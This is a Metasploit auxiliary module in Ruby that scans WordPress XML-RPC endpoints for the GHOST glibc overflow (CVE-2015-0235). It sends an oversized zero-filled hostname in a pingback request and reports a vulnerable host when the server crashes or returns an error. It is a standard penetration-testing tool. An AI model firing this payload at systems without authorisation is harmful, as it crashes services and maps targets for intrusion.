##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress XMLRPC GHOST Vulnerability Scanner',
        'Description' => %q{
          This module can be used to determine hosts vulnerable to the GHOST vulnerability via
          a call to the WordPress XMLRPC interface. If the target is vulnerable, the system
          will segfault and return a server error. On patched systems, a normal XMLRPC error
          is returned.
        },
        'Author' => [
          'Robert Rowley',
          'Christophe De La Fuente',
          'Chaim Sanders',
          'Felipe Costa',
          'Jonathan Claudius',
          'Karl Sigler',
          'Christian Mehlmauer' # metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2015-0235' ],
          [ 'URL', 'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/ghost-gethostbyname-heap-overflow-in-glibc-cve-2015-0235/'],
          [ 'URL', 'http://web.archive.org/web/20250117140537/https://blog.sucuri.net/2015/01/critical-ghost-vulnerability-released.html']
        ],
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptInt.new('LENGTH', [false, 'Payload length', 2500]),
      ]
    )
  end

  def length
    datastore['LENGTH']
  end

  def run_host(ip)
    unless wordpress_and_online?
      print_error("Looks like this site is no WordPress blog")
      return
    end

    unless wordpress_xmlrpc_enabled?
      print_error("XMLRPC interface is not enabled")
      return
    end

    ghost = "0" * length
    payload = "http://#{ghost}/#{Rex::Text.rand_text_alpha(7)}.php"
    xml = wordpress_generate_xml_rpc_body('pingback.ping', payload, payload)

    res = send_request_cgi(
      'uri' => wordpress_url_xmlrpc,
      'method' => 'POST',
      'ctype' => 'text/xml;charset=UTF-8',
      'data' => xml
    )

    if res.nil? || res.code == 500
      print_good("vulnerable to GHOST")
      report_vuln(
        :host => ip,
        :proto => 'tcp',
        :port => datastore['RPORT'],
        :name => self.name,
        :info => "Module #{self.fullname} found GHOST vulnerability",
        :sname => datastore['SSL'] ? "https" : "http"
      )
    else
      print_status("target not vulnerable to GHOST")
    end
  end
end
